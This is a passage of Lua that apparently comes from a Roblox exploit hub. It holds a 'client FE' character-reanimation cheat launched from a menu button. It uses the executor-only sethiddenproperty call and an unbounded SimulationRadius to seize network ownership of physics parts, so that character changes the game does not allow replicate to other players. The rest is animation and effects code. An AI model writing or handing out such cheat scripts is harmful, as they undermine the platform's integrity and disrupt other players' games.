PlusOne.Size = UDim2.new(1, 0, 0.5, -50)
PlusOne.BorderSizePixel = 2
PlusOne.Font = Enum.Font.SourceSansBold
PlusOne.FontSize = Enum.FontSize.Size24
PlusOne.Text = "+.1 Size"
local MinusOne = Instance.new("TextButton", base)
MinusOne.BackgroundColor3 = Color3.new(214/255, 214/255, 214/255)
MinusOne.Position = UDim2.new(0, 0, 0.5, 10)
MinusOne.Size = UDim2.new(1, 0, 0.5, -50)
MinusOne.Text = "-.1 Size"
MinusOne.BorderSizePixel = 2
MinusOne.Font = Enum.Font.SourceSansBold
MinusOne.FontSize = Enum.FontSize.Size24

PlusOne.MouseButton1Down:connect(function()
	csize = csize + .1
	giant(plr, csize)
	indicator.Text = "Current Size: "..tostring(csize)
end)

MinusOne.MouseButton1Down:connect(function()
	csize = csize - .1
	giant(plr, csize)
	indicator.Text = "Current Size: "..tostring(csize)
end)

  	end    

})

Tab:AddButton({

	Name = "变成死侍",

	Callback = function()

     --- converted to client fe by scripty sir ---

HumanDied = false
local CountSCIFIMOVIELOL = 1
function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
	local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL
	AlignPos.ApplyAtCenterOfMass = true;
	AlignPos.MaxForce = 5772000--67752;
	AlignPos.MaxVelocity = math.huge/9e110;
	AlignPos.ReactionForceEnabled = false;
	AlignPos.Responsiveness = 200;
	AlignPos.RigidityEnabled = false;
	local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL
	AlignOri.MaxAngularVelocity = math.huge/9e110;
	AlignOri.MaxTorque = 5772000
	AlignOri.PrimaryAxisOnly = false;
	AlignOri.ReactionTorqueEnabled = false;
	AlignOri.Responsiveness = 200;
	AlignOri.RigidityEnabled = false;
	local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "Ath_"..CountSCIFIMOVIELOL
	local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "Ath_"..CountSCIFIMOVIELOL
	AttachmentA.Orientation = Angle or Vector3.new(0,0,0)
	AttachmentA.Position = Position or Vector3.new(0,0,0)
	AlignPos.Attachment1 = AttachmentA;
	AlignPos.Attachment0 = AttachmentB;
	AlignOri.Attachment1 = AttachmentA;
	AlignOri.Attachment0 = AttachmentB;
	CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1
	return {AlignPos,AlignOri,AttachmentA,AttachmentB}
end

if _G.netted ~= true then
	_G.netted = true
	coroutine.wrap(function()
		settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
		settings().Physics.AllowSleep = false
		game:GetService("RunService").RenderStepped:Connect(function()
			game:FindFirstChildOfClass("Players").LocalPlayer.MaximumSimulationRadius=math.pow(math.huge,math.huge)
			sethiddenproperty(game:FindFirstChildOfClass("Players").LocalPlayer,"SimulationRadius",math.huge*math.huge)
		end)
	end)()
end

game:FindFirstChildOfClass("Players").LocalPlayer["Character"].Archivable = true
local hatnameclone = {}
for _,v in next, game:FindFirstChildOfClass("Players").LocalPlayer["Character"]:GetChildren() do
	if v:IsA("Accessory") then
		if hatnameclone[v.Name] then
			if hatnameclone[v.Name] == "s" then
				hatnameclone[v.Name] = {}
			end
			table.insert(hatnameclone[v.Name],v)
		else
			hatnameclone[v.Name] = "s"
		end
	end
end
for _,v in pairs(hatnameclone) do
	if type(v) == "table" then
		local num = 1
		for _,w in pairs(v) do
			w.Name = w.Name..num
			num = num + 1
		end
	end
end
hatnameclone = nil

local DeadChar = game:FindFirstChildOfClass("Players").LocalPlayer.Character

local fldr = Instance.new("Folder",game:FindFirstChildOfClass("Players").LocalPlayer["Character"])
fldr.Name = "DMYF"
local CloneChar = DeadChar:Clone()
local ANIMATIONHERE
if CloneChar:FindFirstChild("Animate") then
	ANIMATIONHERE = CloneChar:FindFirstChild("Animate"):Clone()
	CloneChar:FindFirstChild("Animate"):Destroy()
end
if CloneChar:FindFirstChildOfClass("Folder") then CloneChar:FindFirstChildOfClass("Folder"):Destroy() end
if CloneChar.Torso:FindFirstChild("Neck") then
	local Clonessss = CloneChar.Torso:FindFirstChild("Neck"):Clone()
	Clonessss.Part0 = nil
	Clonessss.Part1 = DeadChar.Head
	Clonessss.Parent = DeadChar.Torso
end
CloneChar.Parent = fldr
CloneChar.HumanoidRootPart.CFrame = DeadChar.HumanoidRootPart.CFrame
CloneChar.Humanoid.BreakJointsOnDeath = false
CloneChar.Name = "non"
CloneChar.Humanoid.DisplayDistanceType = "None"

for _,v in next, DeadChar:GetChildren() do
	if v:IsA("Accessory") then
		local topacc = false
		if v.Handle:FindFirstChildOfClass("Weld") then v.Handle:FindFirstChildOfClass("Weld"):Destroy() end
		v.Handle.Massless = true
		v.Handle.CanCollide = false
		if v.Handle:FindFirstChildOfClass("Attachment") then
			local ath__ = v.Handle:FindFirstChildOfClass("Attachment")
			if ath__.Name == "HatAttachment" or ath__.Name == "HairAttachment" or ath__.Name == "FaceFrontAttachment" or ath__.Name == "FaceCenterAttachment" then
				topacc = ath__.Name
			end
		end
        local bv = Instance.new("BodyVelocity",v.Handle)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			if topacc then
				local allthings = SCIFIMOVIELOL(v.Handle,DeadChar.Torso,Vector3.new(0,1.5,0)+ (DeadChar.Head[topacc].Position + (v.Handle[topacc].Position*-1)),Vector3.new(0,0,0))
				local normaltop = allthings[1].Attachment1
				local alipos = allthings[1]
				local alirot = allthings[2]
				local p0 = v.Handle
				local p1 = DeadChar.Head
				alipos.Parent = CloneChar:FindFirstChild(v.Name).Handle
				alirot.Parent = CloneChar:FindFirstChild(v.Name).Handle
				while true do
					game:GetService("RunService").RenderStepped:wait()
					if HumanDied then break end
					coroutine.wrap(function()
						if alipos.Attachment1 == normaltop then
							p0.CFrame = p0.CFrame:lerp((((DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)) * p1[topacc].CFrame) * p0[topacc].CFrame:inverse()),1)
						else
							v.Handle.CFrame = v.Handle.CFrame:lerp(alipos.Attachment1.Parent.CFrame * CFrame.new(alipos.Attachment1.Position) * CFrame.Angles(math.rad(alipos.Attachment1.Rotation.X),math.rad(alipos.Attachment1.Rotation.Y),math.rad(alipos.Attachment1.Rotation.Z)),1)
						end
					end)()
				end
			else
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end)()
    end
end

local a = DeadChar.Torso
local b = DeadChar.HumanoidRootPart
local c = DeadChar.Humanoid
a.Parent = game:FindFirstChildOfClass("Workspace")
c.Parent = game:FindFirstChildOfClass("Workspace")
local told = a:Clone()
local told1 = c:Clone()
b["RootJoint"].Part0 = told
b["RootJoint"].Part1 = DeadChar.Head
a.Name = "torso"
a.Neck:Destroy()
c.Name = "Mizt Hub Best"
told.Parent = DeadChar
told1.Parent = DeadChar
DeadChar.PrimaryPart = told
told1.Health = 0
b:Destroy()
a.Parent = DeadChar
c.Parent = DeadChar
told:Destroy()
told1:Destroy()
a.Name = "Torso"

if CloneChar.Head:FindFirstChildOfClass("Decal") then CloneChar.Head:FindFirstChildOfClass("Decal").Transparency = 1 end
if DeadChar:FindFirstChild("Animate") then DeadChar:FindFirstChild("Animate"):Destroy() end

local Collider
function UnCollide()
    if HumanDied then Collider:Disconnect(); return end
    --[[for _,Parts in next, CloneChar:GetChildren() do
        if Parts:IsA("BasePart") then
            Parts.CanCollide = false 
        end 
    end]]
    for _,Parts in next, DeadChar:GetChildren() do
        if Parts:IsA("BasePart") then
        Parts.CanCollide = false
        end 
    end 
end
Collider = game:GetService("RunService").Stepped:Connect(UnCollide)

local resetBindable = Instance.new("BindableEvent")
resetBindable.Event:connect(function()
    game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
	resetBindable:Destroy()
	HumanDied = true
    pcall(function()
		game:FindFirstChildOfClass("Players").LocalPlayer.Character = DeadChar
		DeadChar.Head:Destroy()
		DeadChar:FindFirstChildOfClass("Humanoid"):Destroy()
		game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar
		if DeadChar:FindFirstChildOfClass("Folder") then DeadChar:FindFirstChildOfClass("Folder"):Destroy() end
	end)
end)
game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

coroutine.wrap(function()
    while true do
        game:GetService("RunService").RenderStepped:wait()
        if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChildOfClass("Humanoid") or CloneChar:FindFirstChildOfClass("Humanoid").Health <= 0 and not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChildOfClass("Humanoid") or DeadChar:FindFirstChildOfClass("Humanoid").Health <= 0 then 
            HumanDied = true
            pcall(function()
				game:FindFirstChildOfClass("Players").LocalPlayer.Character = DeadChar
				DeadChar.Head:Destroy()
				DeadChar:FindFirstChildOfClass("Humanoid"):Destroy()
				game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar
				if DeadChar:FindFirstChildOfClass("Folder") then DeadChar:FindFirstChildOfClass("Folder"):Destroy() end
			end)
            if resetBindable then
                game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
                resetBindable:Destroy()
            end
            break
        end		
    end
end)()


SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"])
SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"])
SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"])
SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"])
SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"])
SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"])

for _,v in pairs(DeadChar:GetChildren()) do
	if v:IsA("BasePart") and v.Name ~= "Head" then
		--[[local bv = Instance.new("BodyVelocity",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = CloneChar[v.Name].CFrame
			end
		end)()]]
	elseif v:IsA("BasePart") and v.Name == "Head" then
		local bv = Instance.new("BodyVelocity",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)
			end
		end)()
	end
end

for _,BodyParts in next, CloneChar:GetDescendants() do
if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
BodyParts.Transparency = 1 end end
game:GetService("RunService").RenderStepped:wait()
game:FindFirstChildOfClass("Players").LocalPlayer.Character = CloneChar
game:FindFirstChildOfClass("Workspace"):FindFirstChildOfClass("Camera").CameraSubject = CloneChar.Humanoid

for _,v in next, DeadChar:GetChildren() do
	if v:IsA("Accessory") then
		if v.Handle:FindFirstChildOfClass("Weld") then v.Handle:FindFirstChildOfClass("Weld"):Destroy() end
	end
end

if ANIMATIONHERE then ANIMATIONHERE.Parent = CloneChar end

script:ClearAllChildren()
wait(0.2)

Player = game:GetService("Players").LocalPlayer
PlayerGui = Player.PlayerGui
Cam = workspace.CurrentCamera
Backpack = Player.Backpack
Character = Player.Character
Humanoid = Character.Humanoid
Mouse = Player:GetMouse()
RootPart = Character["HumanoidRootPart"]
Torso = Character["Torso"]
Head = Character["Head"]
RightArm = Character["Right Arm"]
LeftArm = Character["Left Arm"]
RightLeg = Character["Right Leg"]
LeftLeg = Character["Left Leg"]
RootJoint = RootPart["RootJoint"]
Neck = Torso["Neck"]
RightShoulder = Torso["Right Shoulder"]
LeftShoulder = Torso["Left Shoulder"]
RightHip = Torso["Right Hip"]
LeftHip = Torso["Left Hip"]
local TIME = 0
local sick = Instance.new("Sound",Torso)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

--//=================================\\
--|| 	      USEFUL VALUES
--\\=================================//

Animation_Speed = 3
local FORCERESET = false
Frame_Speed = 1 / 60 -- (1 / 30) OR (1 / 60)
local Speed = 16
local ROOTC0 = CF(0, 0, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local NECKC0 = CF(0, 1, 0) * ANGLES(RAD(-90), RAD(0), RAD(180))
local RIGHTSHOULDERC0 = CF(-0.5, 0, 0) * ANGLES(RAD(0), RAD(90), RAD(0))
local LEFTSHOULDERC0 = CF(0.5, 0, 0) * ANGLES(RAD(0), RAD(-90), RAD(0))
local DAMAGEMULTIPLIER = 1
local ANIM = "Idle"
local ATTACK = false
local EQUIPPED = false
local HOLD = false
local COMBO = 1
local Rooted = false
local SINE = 0
local KEYHOLD = false
local CHANGE = 2 / Animation_Speed
local WALKINGANIM = false
local VALUE1 = false
local SIZE = 1
local VALUE2 = false
local MODE = "Insan"
local INTRO = false
local TRANSFORMED = false
local INSTANT = false
local ROBLOXIDLEANIMATION = IT("Animation")
ROBLOXIDLEANIMATION.Name = "Roblox Idle Animation"
ROBLOXIDLEANIMATION.AnimationId = "http://www.roblox.com/asset/?id=180435571"
--ROBLOXIDLEANIMATION.Parent = Humanoid
local WEAPONGUI = IT("ScreenGui", PlayerGui)
WEAPONGUI.Name = "BanishV3Gui"
local Weapon2 = IT("Model")
Weapon2.Name = "Adds"
local Weapon = IT("Model")
Weapon.Name = "Adds"
local BB = IT("Model")
BB.Name = "Adds"
local Dead = IT("Model")
Dead.Name = "Adds"
local Effects = IT("Folder", Weapon)
Effects.Name = "Effects"
local ANIMATOR = Humanoid.Animator
local ANIMATE = Character:FindFirstChild("Animate")
local UNANCHOR = true
local TOBANISH = {}
script.Parent = PlayerGui
local sick = Instance.new("Sound",Character)
sick.Parent = Torso
sick.Playing = true
sick.Looped = true
sick.Volume = 5
sick.Pitch = 1
sick.TimePosition = 0
sick.SoundId = "rbxassetid://1138145518"

--//=================================\\
--\\=================================//


--//=================================\\
--|| SAZERENOS' ARTIFICIAL HEARTBEAT
--\\=================================//

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "ArtificialHB"

script:WaitForChild("ArtificialHB")

frame = Frame_Speed
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.ArtificialHB:Fire()

game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.ArtificialHB:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.ArtificialHB:Fire()
			end
		lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

--//=================================\\
--\\=================================//

--//=================================\\
--|| 	      SOME FUNCTIONS
--\\=================================//

function Raycast(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
	return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
end

function PositiveAngle(NUMBER)
	if NUMBER >= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function NegativeAngle(NUMBER)
	if NUMBER <= 0 then
		NUMBER = 0
	end
	return NUMBER
end

function Swait(NUMBER)
	if NUMBER == 0 or NUMBER == nil then
		ArtificialHB.Event:wait()
	else
		for i = 1, NUMBER do
			ArtificialHB.Event:wait()
		end
	end
end

function CreateMesh(MESH, PARENT, MESHTYPE, MESHID, TEXTUREID, SCALE, OFFSET)
	local NEWMESH = IT(MESH)
	if MESH == "SpecialMesh" then
		NEWMESH.MeshType = MESHTYPE
		if MESHID ~= "nil" and MESHID ~= "" then
			NEWMESH.MeshId = "http://www.roblox.com/asset/?id="..MESHID
		end
		if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
			NEWMESH.TextureId = "http://www.roblox.com/asset/?id="..TEXTUREID
		end
	end
	NEWMESH.Offset = OFFSET or VT(0, 0, 0)
	NEWMESH.Scale = SCALE
	NEWMESH.Parent = PARENT
	return NEWMESH
end

function CreatePart(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
	local NEWPART = IT("Part")
	NEWPART.formFactor = FORMFACTOR
	NEWPART.Reflectance = REFLECTANCE
	NEWPART.Transparency = TRANSPARENCY
	NEWPART.CanCollide = false
	NEWPART.Locked = true
	NEWPART.Anchored = true
	if ANCHOR == false then
		NEWPART.Anchored = false
	end
	NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
	NEWPART.Name = NAME
	NEWPART.Size = SIZE
	NEWPART.Position = Torso.Position
	NEWPART.Material = MATERIAL
	NEWPART:BreakJoints()
	NEWPART.Parent = PARENT
	return NEWPART
end

	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end


function QuaternionFromCFrame(cf)
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
	local trace = m00 + m11 + m22
	if trace > 0 then 
		local s = math.sqrt(1 + trace)
		local recip = 0.5 / s
		return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
	else
		local i = 0
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then
			i = 2
		end
		if i == 0 then
			local s = math.sqrt(m00 - m11 - m22 + 1)
			local recip = 0.5 / s
			return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
		elseif i == 1 then
			local s = math.sqrt(m11 - m22 - m00 + 1)
			local recip = 0.5 / s
			return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
		elseif i == 2 then
			local s = math.sqrt(m22 - m00 - m11 + 1)
			local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
		end
	end
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w)
	local xs, ys, zs = x + x, y + y, z + z
	local wx, wy, wz = w * xs, w * ys, w * zs
	local xx = x * xs
	local xy = x * ys
	local xz = x * zs
	local yy = y * ys
	local yz = y * zs
	local zz = z * zs
	return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
end
 
function QuaternionSlerp(a, b, t)
	local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
	local startInterp, finishInterp;
	if cosTheta >= 0.0001 then
		if (1 - cosTheta) > 0.0001 then
			local theta = ACOS(cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((1 - t) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = 1 - t
			finishInterp = t
		end
	else
		if (1 + cosTheta) > 0.0001 then
			local theta = ACOS(-cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((t - 1) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = t - 1
			finishInterp = t
		end
	end
	return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
end

function Clerp(a, b, t)
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)}
	local ax, ay, az = a.x, a.y, a.z
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1 - t
	return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
end

function CreateFrame(PARENT, TRANSPARENCY, BORDERSIZEPIXEL, POSITION, SIZE, COLOR, BORDERCOLOR, NAME)
	local frame = IT("Frame")
	frame.BackgroundTransparency = TRANSPARENCY
	frame.BorderSizePixel = BORDERSIZEPIXEL
	frame.Position = POSITION
	frame.Size = SIZE
	frame.BackgroundColor3 = COLOR
	frame.BorderColor3 = BORDERCOLOR
	frame.Name = NAME
	frame.Parent = PARENT
	return frame
end

function CreateLabel(PARENT, TEXT, TEXTCOLOR, TEXTFONTSIZE, TEXTFONT, TRANSPARENCY, BORDERSIZEPIXEL, STROKETRANSPARENCY, NAME)
	local label = IT("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UD2(1, 0, 1, 0)
	label.Position = UD2(0, 0, 0, 0)
	label.TextColor3 = TEXTCOLOR
	label.TextStrokeTransparency = STROKETRANSPARENCY
	label.TextTransparency = TRANSPARENCY
	label.FontSize = TEXTFONTSIZE
	label.Font = TEXTFONT
	label.BorderSizePixel = BORDERSIZEPIXEL
	label.TextScaled = false
	label.Text = TEXT
	label.Name = NAME
	label.Parent = PARENT
	return label
end

function NoOutlines(PART)
	PART.TopSurface, PART.BottomSurface, PART.LeftSurface, PART.RightSurface, PART.FrontSurface, PART.BackSurface = 10, 10, 10, 10, 10, 10
end

function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
	local NEWWELD = IT(TYPE)
	NEWWELD.Part0 = PART0
	NEWWELD.Part1 = PART1
	NEWWELD.C0 = C0
	NEWWELD.C1 = C1
	NEWWELD.Parent = PARENT
	return NEWWELD
end

local S = IT("Sound")
function CreateSound(ID, PARENT, VOLUME, PITCH, DOESLOOP)
	local NEWSOUND = nil
	coroutine.resume(coroutine.create(function()
		NEWSOUND = S:Clone()
		NEWSOUND.Parent = PARENT
		NEWSOUND.Volume = VOLUME
		NEWSOUND.Pitch = PITCH
		NEWSOUND.SoundId = "http://www.roblox.com/asset/?id="..ID
		NEWSOUND:play()
		if DOESLOOP == true then
			NEWSOUND.Looped = true
		else
			repeat wait(1) until NEWSOUND.Playing == false or NEWSOUND.Parent ~= PARENT
			NEWSOUND:remove()
		end
	end))
	return NEWSOUND
end

function CFrameFromTopBack(at, top, back)
	local right = top:Cross(back)
	return CF(at.x, at.y, at.z, right.x, top.x, back.x, right.y, top.y, back.y, right.z, top.z, back.z)
end

--WACKYEFFECT({EffectType = "", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = CF(), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,1,1), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
function WACKYEFFECT(Table)
	local TYPE = (Table.EffectType or "Sphere")
	local SIZE = (Table.Size or VT(1,1,1))
	local ENDSIZE = (Table.Size2 or VT(0,0,0))
	local TRANSPARENCY = (Table.Transparency or 0)
	local ENDTRANSPARENCY = (Table.Transparency2 or 1)
	local CFRAME = (Table.CFrame or Torso.CFrame)
	local MOVEDIRECTION = (Table.MoveToPos or nil)
	local ROTATION1 = (Table.RotationX or 0)
	local ROTATION2 = (Table.RotationY or 0)
	local ROTATION3 = (Table.RotationZ or 0)
	local MATERIAL = (Table.Material or "Neon")
	local COLOR = (Table.Color or C3(1,1,1))
	local TIME = (Table.Time or 45)
	local SOUNDID = (Table.SoundID or nil)
	local SOUNDPITCH = (Table.SoundPitch or nil)
	local SOUNDVOLUME = (Table.SoundVolume or nil)
	coroutine.resume(coroutine.create(function()
		local PLAYSSOUND = false
		local SOUND = nil
		local EFFECT = CreatePart(3, Effects, MATERIAL, 0, TRANSPARENCY, BRICKC("Pearl"), "Effect", VT(1,1,1), true)
		if SOUNDID ~= nil and SOUNDPITCH ~= nil and SOUNDVOLUME ~= nil then
			PLAYSSOUND = true
			SOUND = CreateSound(SOUNDID, EFFECT, SOUNDVOLUME, SOUNDPITCH, false)
		end
		EFFECT.Color = COLOR
		local MSH = nil
		if TYPE == "Sphere" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "Sphere", "", "", SIZE, VT(0,0,0))
		elseif TYPE == "Block" then
			MSH = IT("BlockMesh",EFFECT)
			MSH.Scale = VT(SIZE.X,SIZE.X,SIZE.X)
		elseif TYPE == "Wave" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "20329976", "", SIZE, VT(0,0,-SIZE.X/8))
		elseif TYPE == "Ring" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "559831844", "", VT(SIZE.X,SIZE.X,0.1), VT(0,0,0))
		elseif TYPE == "Slash" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662586858", "", VT(SIZE.X/10,0,SIZE.X/10), VT(0,0,0))
		elseif TYPE == "Round Slash" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "662585058", "", VT(SIZE.X/10,0,SIZE.X/10), VT(0,0,0))
		elseif TYPE == "Swirl" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "1051557", "", SIZE, VT(0,0,0))
		elseif TYPE == "Skull" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "4770583", "", SIZE, VT(0,0,0))
		elseif TYPE == "Crystal" then
			MSH = CreateMesh("SpecialMesh", EFFECT, "FileMesh", "9756362", "", SIZE, VT(0,0,0))
		end
		if MSH ~= nil then
			local MOVESPEED = nil
			if MOVEDIRECTION ~= nil then
				MOVESPEED = (CFRAME.p - MOVEDIRECTION).Magnitude/TIME
			end
			local GROWTH = SIZE - ENDSIZE
			local TRANS = TRANSPARENCY - ENDTRANSPARENCY
			if TYPE == "Block" then
				EFFECT.CFrame = CFRAME*ANGLES(RAD(MRANDOM(0,360)),RAD(MRANDOM(0,360)),RAD(MRANDOM(0,360)))
			else
				EFFECT.CFrame = CFRAME
			end
			for LOOP = 1, TIME+1 do
				Swait()
				MSH.Scale = MSH.Scale - GROWTH/TIME
				if TYPE == "Wave" then
					MSH.Offset = VT(0,0,-MSH.Scale.X/8)
				end
				EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
				if TYPE == "Block" then
					EFFECT.CFrame = CFRAME*ANGLES(RAD(MRANDOM(0,360)),RAD(MRANDOM(0,360)),RAD(MRANDOM(0,360)))
				else
					EFFECT.CFrame = EFFECT.CFrame*ANGLES(RAD(ROTATION1),RAD(ROTATION2),RAD(ROTATION3))
				end
				if MOVEDIRECTION ~= nil then
					local ORI = EFFECT.Orientation
					EFFECT.CFrame = CF(EFFECT.Position,MOVEDIRECTION)*CF(0,0,-MOVESPEED)
					EFFECT.Orientation = ORI
				end
			end
			if PLAYSSOUND == false then
				EFFECT:remove()
			else
				SOUND.Stopped:Connect(function()
					EFFECT:remove()
				end)
			end
		else
			if PLAYSSOUND == false then
				EFFECT:remove()
			else
				repeat Swait() until SOUND.Playing == false
				EFFECT:remove()
			end
		end
	end))
end

function MakeForm(PART,TYPE)
	if TYPE == "Cyl" then
		local MSH = IT("CylinderMesh",PART)
	elseif TYPE == "Ball" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Sphere"
	elseif TYPE == "Wedge" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Wedge"
	end
end

function SpawnTrail(FROM,TO,BIG)
	local TRAIL = CreatePart(3, Effects, "Neon", 0, 0.5, "Really red", "Trail", VT(0,0,0))
	MakeForm(TRAIL,"Cyl")
	local DIST = (FROM - TO).Magnitude
	if BIG == true then
		TRAIL.Size = VT(0.5,DIST,0.5)
	else
		TRAIL.Size = VT(0.25,DIST,0.25)
	end
	TRAIL.CFrame = CF(FROM, TO) * CF(0, 0, -DIST/2) * ANGLES(RAD(90),RAD(0),RAD(0))
	coroutine.resume(coroutine.create(function()
		for i = 1, 5 do
			Swait()
			TRAIL.Transparency = TRAIL.Transparency + 0.1
		end
		TRAIL:remove()
	end))
end

Debris = game:GetService("Debris")

function CastProperRay(StartPos, EndPos, Distance, Ignore)
	local DIRECTION = CF(StartPos,EndPos).lookVector
	return Raycast(StartPos, DIRECTION, Distance, Ignore)
end

function turnto(position)
	RootPart.CFrame=CFrame.new(RootPart.CFrame.p,VT(position.X,RootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
end

--//=================================\\
--||	     WEAPON CREATION
--\\=================================//

armor = Instance.new("Part")
armormesh = Instance.new("SpecialMesh")
armor.Anchored = false
armor.CanCollide = false
armor.Size = Vector3.new(1.4, 0.7, 1.3)
armor.BrickColor = BrickColor.new("Black")
armor.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
armor.Material = Enum.Material.SmoothPlastic
armor.Color = Color3.new(0.105882, 0.164706, 0.207843)
armor.RightSurface = Enum.SurfaceType.SmoothNoOutlines
armor.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
armor.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
armor.BackSurface = Enum.SurfaceType.SmoothNoOutlines
armor.TopSurface = Enum.SurfaceType.SmoothNoOutlines
armor.Parent = Character
armor.CFrame = CFrame.new(-87.19, 0.42, -26.37) * CFrame.Angles(0, 0, 0)
armormesh.MeshId = "rbxassetid://840131767"
armormesh.MeshType = Enum.MeshType.FileMesh
armormesh.Parent = armor
local wlf4 = Instance.new("Weld",armor)
wlf4.Part0 = armor
wlf4.Part1 = Torso
wlf4.C0 = wlf4.C0 * CFrame.Angles(math.rad(0),math.rad(180),math.rad(0))
wlf4.C1 = CFrame.new(0,0,0)

local Particle = IT("ParticleEmitter",nil)
Particle.Enabled = false
Particle.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0.3),NumberSequenceKeypoint.new(0.3,0),NumberSequenceKeypoint.new(1,1)})
Particle.LightEmission = 0.5
Particle.Rate = 150
